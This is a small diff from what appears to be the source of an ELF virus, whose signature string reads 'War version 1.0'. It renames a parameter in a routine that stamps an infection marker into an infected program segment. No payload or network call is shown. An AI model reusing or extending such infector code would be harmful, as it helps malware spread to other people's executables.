@@ -16,7 +16,7 @@ __attribute__((always_inline)) static inline void generate_signature(unsigned ch
 	}
 }
 
-__attribute__((always_inline)) static inline void sign_infection(char *dst, const Elf64_Phdr *segment, const unsigned char *key)
+__attribute__((always_inline)) static inline void sign_infection(char *dst, const Elf64_Phdr *segment, const unsigned char *signature)
 {
 	const char beg[] = "War version 1.0 (c)oded by <jle-quel><ddinaut> - [";
 	const char end[] = "]";
@@ -28,7 +28,7 @@ __attribute__((always_inline)) static inline void sign_infection(char *dst, cons
 
 	for (register size_t index = 0; index < SIGNATURE_SIZE; index++)
 	{
-		*(dst + (size + index)) = (key[index] % 10) + 65;
+		*(dst + (size + index)) = (signature[index] % 10) + 65;
 	}
 
 	_memcpy(dst + (size + SIGNATURE_SIZE), end, 1);
